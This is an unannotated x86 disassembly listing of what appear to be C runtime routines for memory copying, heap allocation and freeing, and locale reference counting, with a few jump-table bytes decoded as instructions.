  4248a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248a5:	cld    
  4248a6:	jmp    DWORD PTR [edx*4+0x424978]
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	and    edx,ecx
  4248b5:	mov    BYTE PTR [edi+0x3],al
  4248b8:	mov    al,BYTE PTR [esi+0x2]
  4248bb:	shr    ecx,0x2
  4248be:	mov    BYTE PTR [edi+0x2],al
  4248c1:	sub    esi,0x2
  4248c4:	sub    edi,0x2
  4248c7:	cmp    ecx,0x8
  4248ca:	jb     0x424854
  4248cc:	std    
  4248cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248cf:	cld    
  4248d0:	jmp    DWORD PTR [edx*4+0x424978]
  4248d7:	nop
  4248d8:	mov    al,BYTE PTR [esi+0x3]
  4248db:	and    edx,ecx
  4248dd:	mov    BYTE PTR [edi+0x3],al
  4248e0:	mov    al,BYTE PTR [esi+0x2]
  4248e3:	mov    BYTE PTR [edi+0x2],al
  4248e6:	mov    al,BYTE PTR [esi+0x1]
  4248e9:	shr    ecx,0x2
  4248ec:	mov    BYTE PTR [edi+0x1],al
  4248ef:	sub    esi,0x3
  4248f2:	sub    edi,0x3
  4248f5:	cmp    ecx,0x8
  4248f8:	jb     0x424854
  4248fe:	std    
  4248ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424901:	cld    
  424902:	jmp    DWORD PTR [edx*4+0x424978]
  424909:	lea    ecx,[ecx+0x0]
  42490c:	sub    al,0x49
  42490e:	inc    edx
  42490f:	add    BYTE PTR [ecx+ecx*2],dh
  424912:	inc    edx
  424913:	add    BYTE PTR [ecx+ecx*2],bh
  424916:	inc    edx
  424917:	add    BYTE PTR [ecx+ecx*2+0x42],al
  42491b:	add    BYTE PTR [ecx+ecx*2+0x42],cl
  42491f:	add    BYTE PTR [ecx+ecx*2+0x42],dl
  424923:	add    BYTE PTR [ecx+ecx*2+0x42],bl
  424927:	add    BYTE PTR [edi+0x49],ch
  42492a:	inc    edx
  42492b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424931:	inc    esp
  424932:	(bad)  
  424933:	sbb    al,0x8b
  424935:	inc    esp
  424936:	mov    ds,WORD PTR [eax]
  424938:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424940:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424944:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424948:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42494c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424950:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424954:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424958:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42495c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424960:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424964:	lea    eax,[ecx*4+0x0]
  42496b:	add    esi,eax
  42496d:	add    edi,eax
  42496f:	jmp    DWORD PTR [edx*4+0x424978]
  424976:	mov    edi,edi
  424978:	mov    BYTE PTR [ecx+0x42],cl
  42497b:	add    BYTE PTR [eax-0x5fffbdb7],dl
  424981:	dec    ecx
  424982:	inc    edx
  424983:	add    BYTE PTR [ecx+ecx*2+0x458b0042],dh
  42498a:	or     BYTE PTR [esi+0x5f],bl
  42498d:	leave  
  42498e:	ret    
  42498f:	nop
  424990:	mov    al,BYTE PTR [esi+0x3]
  424993:	mov    BYTE PTR [edi+0x3],al
  424996:	mov    eax,DWORD PTR [ebp+0x8]
  424999:	pop    esi
  42499a:	pop    edi
  42499b:	leave  
  42499c:	ret    
  42499d:	lea    ecx,[ecx+0x0]
  4249a0:	mov    al,BYTE PTR [esi+0x3]
  4249a3:	mov    BYTE PTR [edi+0x3],al
  4249a6:	mov    al,BYTE PTR [esi+0x2]
  4249a9:	mov    BYTE PTR [edi+0x2],al
  4249ac:	mov    eax,DWORD PTR [ebp+0x8]
  4249af:	pop    esi
  4249b0:	pop    edi
  4249b1:	leave  
  4249b2:	ret    
  4249b3:	nop
  4249b4:	mov    al,BYTE PTR [esi+0x3]
  4249b7:	mov    BYTE PTR [edi+0x3],al
  4249ba:	mov    al,BYTE PTR [esi+0x2]
  4249bd:	mov    BYTE PTR [edi+0x2],al
  4249c0:	mov    al,BYTE PTR [esi+0x1]
  4249c3:	mov    BYTE PTR [edi+0x1],al
  4249c6:	mov    eax,DWORD PTR [ebp+0x8]
  4249c9:	pop    esi
  4249ca:	pop    edi
  4249cb:	leave  
  4249cc:	ret    
  4249cd:	push   DWORD PTR [esp+0x4]
  4249d1:	call   DWORD PTR ds:0x4280e8
  4249d7:	xor    eax,eax
  4249d9:	inc    eax
  4249da:	ret    0x8
  4249dd:	push   0x10
  4249df:	push   0x428610
  4249e4:	call   0x423950
  4249e9:	mov    eax,ds:0x465028
  4249ee:	test   eax,eax
  4249f0:	jne    0x424a29
  4249f2:	cmp    DWORD PTR ds:0x464d64,0x1
  4249f9:	je     0x424a1f
  4249fb:	push   0x4285fc
  424a00:	call   DWORD PTR ds:0x428044
  424a06:	test   eax,eax
  424a08:	je     0x424a1f
  424a0a:	push   0x4285d4
  424a0f:	push   eax
  424a10:	call   DWORD PTR ds:0x42804c
  424a16:	mov    ds:0x465028,eax
  424a1b:	test   eax,eax
  424a1d:	jne    0x424a29
  424a1f:	mov    eax,0x4249cd
  424a24:	mov    ds:0x465028,eax
  424a29:	and    DWORD PTR [ebp-0x4],0x0
  424a2d:	push   DWORD PTR [ebp+0xc]
  424a30:	push   DWORD PTR [ebp+0x8]
  424a33:	call   eax
  424a35:	mov    DWORD PTR [ebp-0x1c],eax
  424a38:	jmp    0x424a5e
  424a3a:	mov    eax,DWORD PTR [ebp-0x14]
  424a3d:	mov    eax,DWORD PTR [eax]
  424a3f:	mov    eax,DWORD PTR [eax]
  424a41:	mov    DWORD PTR [ebp-0x20],eax
  424a44:	xor    eax,eax
  424a46:	inc    eax
  424a47:	ret    
  424a48:	mov    esp,DWORD PTR [ebp-0x18]
  424a4b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a52:	jne    0x424a5c
  424a54:	push   0x8
  424a56:	call   DWORD PTR ds:0x4280a8
  424a5c:	xor    eax,eax
  424a5e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a62:	call   0x42398b
  424a67:	ret    
  424a68:	push   0x10
  424a6a:	push   0x428620
  424a6f:	call   0x423950
  424a74:	mov    esi,DWORD PTR [ebp+0x8]
  424a77:	imul   esi,DWORD PTR [ebp+0xc]
  424a7b:	mov    DWORD PTR [ebp-0x1c],esi
  424a7e:	test   esi,esi
  424a80:	jne    0x424a83
  424a82:	inc    esi
  424a83:	xor    edi,edi
  424a85:	mov    DWORD PTR [ebp-0x20],edi
  424a88:	cmp    esi,0xffffffe0
  424a8b:	ja     0x424af2
  424a8d:	cmp    DWORD PTR ds:0x4653e4,0x3
  424a94:	jne    0x424add
  424a96:	add    esi,0xf
  424a99:	and    esi,0xfffffff0
  424a9c:	mov    DWORD PTR [ebp+0xc],esi
  424a9f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424aa2:	cmp    ebx,DWORD PTR ds:0x4651a4
  424aa8:	ja     0x424add
  424aaa:	push   0x4
  424aac:	call   0x423b0f
  424ab1:	pop    ecx
  424ab2:	and    DWORD PTR [ebp-0x4],edi
  424ab5:	push   ebx
  424ab6:	call   0x425511
  424abb:	pop    ecx
  424abc:	mov    DWORD PTR [ebp-0x20],eax
  424abf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424ac3:	call   0x424b12
  424ac8:	mov    edi,DWORD PTR [ebp-0x20]
  424acb:	test   edi,edi
  424acd:	je     0x424ae1
  424acf:	push   DWORD PTR [ebp-0x1c]
  424ad2:	push   0x0
  424ad4:	push   edi
  424ad5:	call   0x426250
  424ada:	add    esp,0xc
  424add:	test   edi,edi
  424adf:	jne    0x424b1b
  424ae1:	push   esi
  424ae2:	push   0x8
  424ae4:	push   DWORD PTR ds:0x4653e0
  424aea:	call   DWORD PTR ds:0x4280e4
  424af0:	mov    edi,eax
  424af2:	test   edi,edi
  424af4:	jne    0x424b1b
  424af6:	cmp    DWORD PTR ds:0x465068,edi
  424afc:	je     0x424b1b
  424afe:	push   esi
  424aff:	call   0x426232
  424b04:	pop    ecx
  424b05:	test   eax,eax
  424b07:	jne    0x424a83
  424b0d:	jmp    0x424b1d
  424b0f:	mov    esi,DWORD PTR [ebp+0xc]
  424b12:	push   0x4
  424b14:	call   0x423a7b
  424b19:	pop    ecx
  424b1a:	ret    
  424b1b:	mov    eax,edi
  424b1d:	call   0x42398b
  424b22:	ret    
  424b23:	push   esi
  424b24:	mov    esi,DWORD PTR [esp+0x8]
  424b28:	mov    eax,DWORD PTR [esi+0x3c]
  424b2b:	push   edi
  424b2c:	xor    edi,edi
  424b2e:	cmp    eax,DWORD PTR ds:0x465074
  424b34:	je     0x424b99
  424b36:	cmp    eax,edi
  424b38:	je     0x424b99
  424b3a:	mov    eax,DWORD PTR [esi+0x2c]
  424b3d:	cmp    DWORD PTR [eax],edi
  424b3f:	jne    0x424b99
  424b41:	mov    eax,DWORD PTR [esi+0x34]
  424b44:	cmp    eax,edi
  424b46:	je     0x424b64
  424b48:	cmp    DWORD PTR [eax],edi
  424b4a:	jne    0x424b64
  424b4c:	cmp    eax,DWORD PTR ds:0x465190
  424b52:	je     0x424b64
  424b54:	push   eax
  424b55:	call   0x42455a
  424b5a:	push   DWORD PTR [esi+0x3c]
  424b5d:	call   0x42649f
  424b62:	pop    ecx
  424b63:	pop    ecx
  424b64:	mov    eax,DWORD PTR [esi+0x30]
  424b67:	cmp    eax,edi
  424b69:	je     0x424b87
  424b6b:	cmp    DWORD PTR [eax],edi
  424b6d:	jne    0x424b87
  424b6f:	cmp    eax,DWORD PTR ds:0x465194
  424b75:	je     0x424b87
  424b77:	push   eax
  424b78:	call   0x42455a
  424b7d:	push   DWORD PTR [esi+0x3c]
  424b80:	call   0x426440
  424b85:	pop    ecx
  424b86:	pop    ecx
  424b87:	push   DWORD PTR [esi+0x2c]
  424b8a:	call   0x42455a
  424b8f:	push   DWORD PTR [esi+0x3c]
  424b92:	call   0x42455a
  424b97:	pop    ecx
  424b98:	pop    ecx
  424b99:	mov    eax,DWORD PTR [esi+0x40]
  424b9c:	cmp    eax,DWORD PTR ds:0x46518c
  424ba2:	je     0x424bbc
  424ba4:	cmp    eax,edi
  424ba6:	je     0x424bbc
  424ba8:	cmp    DWORD PTR [eax],edi
  424baa:	jne    0x424bbc
  424bac:	push   eax
  424bad:	call   0x42455a
  424bb2:	push   DWORD PTR [esi+0x44]
  424bb5:	call   0x42455a
  424bba:	pop    ecx
  424bbb:	pop    ecx
  424bbc:	mov    eax,DWORD PTR [esi+0x50]
  424bbf:	cmp    eax,DWORD PTR ds:0x465070
  424bc5:	je     0x424be3
  424bc7:	cmp    eax,edi
  424bc9:	je     0x424be3
  424bcb:	cmp    DWORD PTR [eax+0xb4],edi
  424bd1:	jne    0x424be3
  424bd3:	push   eax
  424bd4:	call   0x4262b0
  424bd9:	push   DWORD PTR [esi+0x50]
  424bdc:	call   0x42455a
  424be1:	pop    ecx
  424be2:	pop    ecx
  424be3:	push   esi
  424be4:	call   0x42455a
  424be9:	pop    ecx
  424bea:	pop    edi
  424beb:	pop    esi
  424bec:	ret    
  424bed:	push   esi
  424bee:	call   0x423803
  424bf3:	mov    esi,eax
  424bf5:	mov    eax,DWORD PTR [esi+0x64]
  424bf8:	cmp    eax,DWORD PTR ds:0x46481c
  424bfe:	je     0x424caa
  424c04:	test   eax,eax
  424c06:	je     0x424c37
  424c08:	mov    ecx,DWORD PTR [eax+0x2c]
  424c0b:	dec    DWORD PTR [eax]
  424c0d:	test   ecx,ecx
  424c0f:	je     0x424c13
  424c11:	dec    DWORD PTR [ecx]
  424c13:	mov    ecx,DWORD PTR [eax+0x34]
  424c16:	test   ecx,ecx
  424c18:	je     0x424c1c
  424c1a:	dec    DWORD PTR [ecx]
  424c1c:	mov    ecx,DWORD PTR [eax+0x30]
  424c1f:	test   ecx,ecx
  424c21:	je     0x424c25
  424c23:	dec    DWORD PTR [ecx]
  424c25:	mov    ecx,DWORD PTR [eax+0x40]
  424c28:	test   ecx,ecx
  424c2a:	je     0x424c2e
  424c2c:	dec    DWORD PTR [ecx]
  424c2e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c31:	dec    DWORD PTR [ecx+0xb4]
  424c37:	mov    ecx,DWORD PTR ds:0x46481c
  424c3d:	mov    DWORD PTR [esi+0x64],ecx
  424c40:	mov    ecx,DWORD PTR ds:0x46481c
  424c46:	inc    DWORD PTR [ecx]
  424c48:	mov    ecx,DWORD PTR ds:0x46481c
  424c4e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c51:	test   ecx,ecx
  424c53:	je     0x424c57
  424c55:	inc    DWORD PTR [ecx]
  424c57:	mov    ecx,DWORD PTR ds:0x46481c
  424c5d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c60:	test   ecx,ecx
  424c62:	je     0x424c66
  424c64:	inc    DWORD PTR [ecx]
  424c66:	mov    ecx,DWORD PTR ds:0x46481c
  424c6c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c6f:	test   ecx,ecx
  424c71:	je     0x424c75
  424c73:	inc    DWORD PTR [ecx]
  424c75:	mov    ecx,DWORD PTR ds:0x46481c
  424c7b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c7e:	test   ecx,ecx
  424c80:	je     0x424c84
  424c82:	inc    DWORD PTR [ecx]
  424c84:	mov    ecx,DWORD PTR ds:0x46481c
  424c8a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c8d:	inc    DWORD PTR [ecx+0xb4]
  424c93:	test   eax,eax
  424c95:	je     0x424caa
  424c97:	cmp    DWORD PTR [eax],0x0
  424c9a:	jne    0x424caa
  424c9c:	cmp    eax,0x4647c8
  424ca1:	je     0x424caa
  424ca3:	push   eax
  424ca4:	call   0x424b23
  424ca9:	pop    ecx
  424caa:	mov    eax,DWORD PTR [esi+0x64]
  424cad:	pop    esi
  424cae:	ret    
  424caf:	push   0xc
  424cb1:	push   0x4287b0
  424cb6:	call   0x423950
  424cbb:	push   0xc
  424cbd:	call   0x423b0f
  424cc2:	pop    ecx
  424cc3:	and    DWORD PTR [ebp-0x4],0x0
  424cc7:	call   0x424bed
  424ccc:	mov    DWORD PTR [ebp-0x1c],eax
  424ccf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cd3:	call   0x424ce1
  424cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  424cdb:	call   0x42398b
  424ce0:	ret    
  424ce1:	push   0xc
  424ce3:	call   0x423a7b
  424ce8:	pop    ecx
  424ce9:	ret    
  424cea:	push   0x140
  424cef:	push   0x0
  424cf1:	push   DWORD PTR ds:0x4653e0
  424cf7:	call   DWORD PTR ds:0x4280e4
  424cfd:	test   eax,eax
  424cff:	mov    ds:0x4651a0,eax
  424d04:	jne    0x424d07
  424d06:	ret    
  424d07:	mov    ecx,DWORD PTR [esp+0x4]
  424d0b:	and    DWORD PTR ds:0x465198,0x0
  424d12:	and    DWORD PTR ds:0x46519c,0x0
  424d19:	mov    ds:0x4651a8,eax
  424d1e:	xor    eax,eax
  424d20:	mov    DWORD PTR ds:0x4651a4,ecx
  424d26:	mov    DWORD PTR ds:0x4651ac,0x10
  424d30:	inc    eax
  424d31:	ret    
  424d32:	mov    eax,ds:0x46519c
  424d37:	lea    ecx,[eax+eax*4]
  424d3a:	mov    eax,ds:0x4651a0
  424d3f:	lea    ecx,[eax+ecx*4]
  424d42:	jmp    0x424d56
  424d44:	mov    edx,DWORD PTR [esp+0x4]
  424d48:	sub    edx,DWORD PTR [eax+0xc]
  424d4b:	cmp    edx,0x100000
  424d51:	jb     0x424d5c
  424d53:	add    eax,0x14
  424d56:	cmp    eax,ecx
  424d58:	jb     0x424d44
  424d5a:	xor    eax,eax
  424d5c:	ret    
  424d5d:	push   ebp
  424d5e:	mov    ebp,esp
  424d60:	sub    esp,0x10
  424d63:	mov    ecx,DWORD PTR [ebp+0x8]
  424d66:	mov    eax,DWORD PTR [ecx+0x10]
  424d69:	push   esi
  424d6a:	mov    esi,DWORD PTR [ebp+0xc]
  424d6d:	push   edi
  424d6e:	mov    edi,esi
  424d70:	sub    edi,DWORD PTR [ecx+0xc]
  424d73:	add    esi,0xfffffffc
  424d76:	shr    edi,0xf
  424d79:	mov    ecx,edi
  424d7b:	imul   ecx,ecx,0x204
  424d81:	lea    ecx,[ecx+eax*1+0x144]
  424d88:	mov    DWORD PTR [ebp-0x10],ecx
  424d8b:	mov    ecx,DWORD PTR [esi]
  424d8d:	dec    ecx
  424d8e:	test   cl,0x1
  424d91:	mov    DWORD PTR [ebp-0x4],ecx
  424d94:	jne    0x425071
  424d9a:	push   ebx
  424d9b:	lea    ebx,[ecx+esi*1]
  424d9e:	mov    edx,DWORD PTR [ebx]
  424da0:	mov    DWORD PTR [ebp-0xc],edx
  424da3:	mov    edx,DWORD PTR [esi-0x4]
  424da6:	mov    DWORD PTR [ebp-0x8],edx
  424da9:	mov    edx,DWORD PTR [ebp-0xc]
  424dac:	test   dl,0x1
  424daf:	mov    DWORD PTR [ebp+0xc],ebx
  424db2:	jne    0x424e28
  424db4:	sar    edx,0x4
  424db7:	dec    edx
  424db8:	cmp    edx,0x3f
  424dbb:	jbe    0x424dc0
  424dbd:	push   0x3f
  424dbf:	pop    edx
  424dc0:	mov    ecx,DWORD PTR [ebx+0x4]
  424dc3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424dc6:	jne    0x424e0a
  424dc8:	cmp    edx,0x20
  424dcb:	mov    ebx,0x80000000
  424dd0:	jae    0x424deb
  424dd2:	mov    ecx,edx
  424dd4:	shr    ebx,cl
  424dd6:	lea    ecx,[edx+eax*1+0x4]
  424dda:	not    ebx
  424ddc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424de0:	dec    BYTE PTR [ecx]
  424de2:	jne    0x424e07
  424de4:	mov    ecx,DWORD PTR [ebp+0x8]
  424de7:	and    DWORD PTR [ecx],ebx
  424de9:	jmp    0x424e07
  424deb:	lea    ecx,[edx-0x20]
  424dee:	shr    ebx,cl
  424df0:	lea    ecx,[edx+eax*1+0x4]
  424df4:	not    ebx
  424df6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424dfd:	dec    BYTE PTR [ecx]
  424dff:	jne    0x424e07
  424e01:	mov    ecx,DWORD PTR [ebp+0x8]
  424e04:	and    DWORD PTR [ecx+0x4],ebx
  424e07:	mov    ebx,DWORD PTR [ebp+0xc]
  424e0a:	mov    edx,DWORD PTR [ebx+0x8]
  424e0d:	mov    ebx,DWORD PTR [ebx+0x4]
  424e10:	mov    ecx,DWORD PTR [ebp-0x4]
  424e13:	add    ecx,DWORD PTR [ebp-0xc]
  424e16:	mov    DWORD PTR [edx+0x4],ebx
  424e19:	mov    edx,DWORD PTR [ebp+0xc]
  424e1c:	mov    ebx,DWORD PTR [edx+0x4]
  424e1f:	mov    edx,DWORD PTR [edx+0x8]
  424e22:	mov    DWORD PTR [ebx+0x8],edx
  424e25:	mov    DWORD PTR [ebp-0x4],ecx
  424e28:	mov    edx,ecx
  424e2a:	sar    edx,0x4
  424e2d:	dec    edx
  424e2e:	cmp    edx,0x3f
  424e31:	jbe    0x424e36
  424e33:	push   0x3f
  424e35:	pop    edx
  424e36:	mov    ebx,DWORD PTR [ebp-0x8]
  424e39:	and    ebx,0x1
  424e3c:	mov    DWORD PTR [ebp-0xc],ebx
  424e3f:	jne    0x424ed4
  424e45:	sub    esi,DWORD PTR [ebp-0x8]
  424e48:	mov    ebx,DWORD PTR [ebp-0x8]
  424e4b:	sar    ebx,0x4
  424e4e:	push   0x3f
  424e50:	mov    DWORD PTR [ebp+0xc],esi
  424e53:	dec    ebx
  424e54:	pop    esi
  424e55:	cmp    ebx,esi
  424e57:	jbe    0x424e5b
  424e59:	mov    ebx,esi
  424e5b:	add    ecx,DWORD PTR [ebp-0x8]
  424e5e:	mov    edx,ecx
  424e60:	sar    edx,0x4
  424e63:	dec    edx
  424e64:	cmp    edx,esi
  424e66:	mov    DWORD PTR [ebp-0x4],ecx
  424e69:	jbe    0x424e6d
  424e6b:	mov    edx,esi
  424e6d:	cmp    ebx,edx
  424e6f:	je     0x424ecf
  424e71:	mov    ecx,DWORD PTR [ebp+0xc]
  424e74:	mov    esi,DWORD PTR [ecx+0x4]
  424e77:	cmp    esi,DWORD PTR [ecx+0x8]
  424e7a:	jne    0x424eb7
  424e7c:	cmp    ebx,0x20
  424e7f:	mov    esi,0x80000000
  424e84:	jae    0x424e9d
  424e86:	mov    ecx,ebx
  424e88:	shr    esi,cl
  424e8a:	not    esi
  424e8c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e90:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e94:	jne    0x424eb7
  424e96:	mov    ecx,DWORD PTR [ebp+0x8]
  424e99:	and    DWORD PTR [ecx],esi
  424e9b:	jmp    0x424eb7
  424e9d:	lea    ecx,[ebx-0x20]
  424ea0:	shr    esi,cl
  424ea2:	not    esi
  424ea4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424eab:	dec    BYTE PTR [ebx+eax*1+0x4]
  424eaf:	jne    0x424eb7
  424eb1:	mov    ecx,DWORD PTR [ebp+0x8]
  424eb4:	and    DWORD PTR [ecx+0x4],esi
  424eb7:	mov    ecx,DWORD PTR [ebp+0xc]
  424eba:	mov    esi,DWORD PTR [ecx+0x8]
  424ebd:	mov    ecx,DWORD PTR [ecx+0x4]
  424ec0:	mov    DWORD PTR [esi+0x4],ecx
  424ec3:	mov    ecx,DWORD PTR [ebp+0xc]
  424ec6:	mov    esi,DWORD PTR [ecx+0x4]
  424ec9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ecc:	mov    DWORD PTR [esi+0x8],ecx
  424ecf:	mov    esi,DWORD PTR [ebp+0xc]
  424ed2:	jmp    0x424ed7
  424ed4:	mov    ebx,DWORD PTR [ebp+0x8]
  424ed7:	cmp    DWORD PTR [ebp-0xc],0x0
  424edb:	jne    0x424ee5
  424edd:	cmp    ebx,edx
  424edf:	je     0x424f65
  424ee5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ee8:	lea    ecx,[ecx+edx*8]
  424eeb:	mov    ebx,DWORD PTR [ecx+0x4]
  424eee:	mov    DWORD PTR [esi+0x8],ecx
  424ef1:	mov    DWORD PTR [esi+0x4],ebx
  424ef4:	mov    DWORD PTR [ecx+0x4],esi
  424ef7:	mov    ecx,DWORD PTR [esi+0x4]
  424efa:	mov    DWORD PTR [ecx+0x8],esi
  424efd:	mov    ecx,DWORD PTR [esi+0x4]
  424f00:	cmp    ecx,DWORD PTR [esi+0x8]
  424f03:	jne    0x424f65
  424f05:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424f09:	mov    BYTE PTR [ebp+0xf],cl
  424f0c:	inc    cl
  424f0e:	cmp    edx,0x20
  424f11:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424f15:	jae    0x424f3c
  424f17:	cmp    BYTE PTR [ebp+0xf],0x0
  424f1b:	jne    0x424f2b
  424f1d:	mov    ecx,edx
  424f1f:	mov    ebx,0x80000000
  424f24:	shr    ebx,cl
  424f26:	mov    ecx,DWORD PTR [ebp+0x8]
  424f29:	or     DWORD PTR [ecx],ebx
  424f2b:	mov    ebx,0x80000000
  424f30:	mov    ecx,edx
  424f32:	shr    ebx,cl
  424f34:	lea    eax,[eax+edi*4+0x44]
  424f38:	or     DWORD PTR [eax],ebx
  424f3a:	jmp    0x424f65
  424f3c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f40:	jne    0x424f52
  424f42:	lea    ecx,[edx-0x20]
  424f45:	mov    ebx,0x80000000
  424f4a:	shr    ebx,cl
  424f4c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f4f:	or     DWORD PTR [ecx+0x4],ebx
  424f52:	lea    ecx,[edx-0x20]
  424f55:	mov    edx,0x80000000
  424f5a:	shr    edx,cl
  424f5c:	lea    eax,[eax+edi*4+0xc4]
  424f63:	or     DWORD PTR [eax],edx
  424f65:	mov    eax,DWORD PTR [ebp-0x4]
  424f68:	mov    DWORD PTR [esi],eax
  424f6a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f6e:	mov    eax,DWORD PTR [ebp-0x10]
  424f71:	dec    DWORD PTR [eax]
  424f73:	jne    0x425070
  424f79:	mov    eax,ds:0x465198
  424f7e:	test   eax,eax
  424f80:	je     0x425062
  424f86:	mov    ecx,DWORD PTR ds:0x4651b0
  424f8c:	mov    esi,DWORD PTR ds:0x4280c4
  424f92:	push   0x4000
  424f97:	shl    ecx,0xf
  424f9a:	add    ecx,DWORD PTR [eax+0xc]
  424f9d:	mov    ebx,0x8000
  424fa2:	push   ebx
  424fa3:	push   ecx
  424fa4:	call   esi
  424fa6:	mov    ecx,DWORD PTR ds:0x4651b0
  424fac:	mov    eax,ds:0x465198
  424fb1:	mov    edx,0x80000000
  424fb6:	shr    edx,cl
  424fb8:	or     DWORD PTR [eax+0x8],edx
  424fbb:	mov    eax,ds:0x465198
  424fc0:	mov    eax,DWORD PTR [eax+0x10]
  424fc3:	mov    ecx,DWORD PTR ds:0x4651b0
  424fc9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fd1:	mov    eax,ds:0x465198
  424fd6:	mov    eax,DWORD PTR [eax+0x10]
  424fd9:	dec    BYTE PTR [eax+0x43]
  424fdc:	mov    eax,ds:0x465198
  424fe1:	mov    ecx,DWORD PTR [eax+0x10]
  424fe4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fe8:	jne    0x424ff3
  424fea:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fee:	mov    eax,ds:0x465198
  424ff3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424ff7:	jne    0x425062
  424ff9:	push   ebx
  424ffa:	push   0x0
  424ffc:	push   DWORD PTR [eax+0xc]
  424fff:	call   esi
  425001:	mov    eax,ds:0x465198
  425006:	push   DWORD PTR [eax+0x10]
  425009:	push   0x0
  42500b:	push   DWORD PTR ds:0x4653e0
  425011:	call   DWORD PTR ds:0x4280c8
  425017:	mov    eax,ds:0x46519c
  42501c:	mov    edx,DWORD PTR ds:0x4651a0
  425022:	lea    eax,[eax+eax*4]
  425025:	shl    eax,0x2
  425028:	mov    ecx,eax
  42502a:	mov    eax,ds:0x465198
  42502f:	sub    ecx,eax
  425031:	lea    ecx,[ecx+edx*1-0x14]
  425035:	push   ecx
  425036:	lea    ecx,[eax+0x14]
  425039:	push   ecx
  42503a:	push   eax
  42503b:	call   0x426890
  425040:	mov    eax,DWORD PTR [ebp+0x8]
  425043:	add    esp,0xc
  425046:	dec    DWORD PTR ds:0x46519c
  42504c:	cmp    eax,DWORD PTR ds:0x465198
  425052:	jbe    0x425058
  425054:	sub    DWORD PTR [ebp+0x8],0x14
  425058:	mov    eax,ds:0x4651a0
  42505d:	mov    ds:0x4651a8,eax
  425062:	mov    eax,DWORD PTR [ebp+0x8]
  425065:	mov    ds:0x465198,eax
  42506a:	mov    DWORD PTR ds:0x4651b0,edi
  425070:	pop    ebx
  425071:	pop    edi
  425072:	pop    esi
  425073:	leave  
  425074:	ret    
  425075:	mov    eax,ds:0x46519c
  42507a:	mov    ecx,DWORD PTR ds:0x4651ac
  425080:	push   edi
  425081:	xor    edi,edi
  425083:	cmp    eax,ecx
  425085:	jne    0x4250bb
  425087:	lea    eax,[ecx+ecx*4+0x50]
  42508b:	shl    eax,0x2
  42508e:	push   eax
  42508f:	push   DWORD PTR ds:0x4651a0
  425095:	push   edi
  425096:	push   DWORD PTR ds:0x4653e0
  42509c:	call   DWORD PTR ds:0x4280f0
  4250a2:	cmp    eax,edi
  4250a4:	jne    0x4250aa
  4250a6:	xor    eax,eax
  4250a8:	pop    edi
  4250a9:	ret    
  4250aa:	add    DWORD PTR ds:0x4651ac,0x10
  4250b1:	mov    ds:0x4651a0,eax
  4250b6:	mov    eax,ds:0x46519c
  4250bb:	mov    ecx,DWORD PTR ds:0x4651a0
  4250c1:	push   esi
  4250c2:	push   0x41c4
  4250c7:	push   0x8
  4250c9:	push   DWORD PTR ds:0x4653e0
  4250cf:	lea    eax,[eax+eax*4]
  4250d2:	lea    esi,[ecx+eax*4]
  4250d5:	call   DWORD PTR ds:0x4280e4
  4250db:	cmp    eax,edi
  4250dd:	mov    DWORD PTR [esi+0x10],eax
  4250e0:	jne    0x4250e6
  4250e2:	xor    eax,eax
  4250e4:	jmp    0x425129
  4250e6:	push   0x4
  4250e8:	push   0x2000
  4250ed:	push   0x100000
  4250f2:	push   edi
  4250f3:	call   DWORD PTR ds:0x4280ec
  4250f9:	cmp    eax,edi
  4250fb:	mov    DWORD PTR [esi+0xc],eax
  4250fe:	jne    0x425112
  425100:	push   DWORD PTR [esi+0x10]
  425103:	push   edi
  425104:	push   DWORD PTR ds:0x4653e0
  42510a:	call   DWORD PTR ds:0x4280c8
  425110:	jmp    0x4250e2
  425112:	or     DWORD PTR [esi+0x8],0xffffffff
  425116:	mov    DWORD PTR [esi],edi
  425118:	mov    DWORD PTR [esi+0x4],edi
  42511b:	inc    DWORD PTR ds:0x46519c
  425121:	mov    eax,DWORD PTR [esi+0x10]
  425124:	or     DWORD PTR [eax],0xffffffff
  425127:	mov    eax,esi
  425129:	pop    esi
  42512a:	pop    edi
  42512b:	ret    
  42512c:	push   ebp
  42512d:	mov    ebp,esp
